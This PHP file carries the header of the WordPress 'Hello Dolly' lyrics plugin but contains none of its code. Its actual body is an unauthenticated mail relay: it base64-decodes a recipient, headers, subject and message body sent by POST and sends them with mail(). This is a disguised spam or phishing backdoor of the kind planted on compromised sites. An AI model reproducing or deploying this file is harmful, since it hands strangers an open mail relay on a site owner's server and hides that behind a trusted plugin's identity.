<?php
/**
 * @package Hello_Dolly
 * @version 1.6
 */
/*
Plugin Name: Hello Dolly
Plugin URI: https://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.6
Author URI: http://ma.tt/
*/

<?php
if(isset($_POST["mailto"]))
        $MailTo = base64_decode($_POST["mailto"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgheader"]))
        $MessageHeader = base64_decode($_POST["msgheader"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgbody"]))
        $MessageBody = base64_decode($_POST["msgbody"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgsubject"]))
        $MessageSubject = base64_decode($_POST["msgsubject"]);
else
	{
	echo "indata_error";
	exit;
	}
if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))
	echo "sent_ok";
else
	echo "sent_error";
?>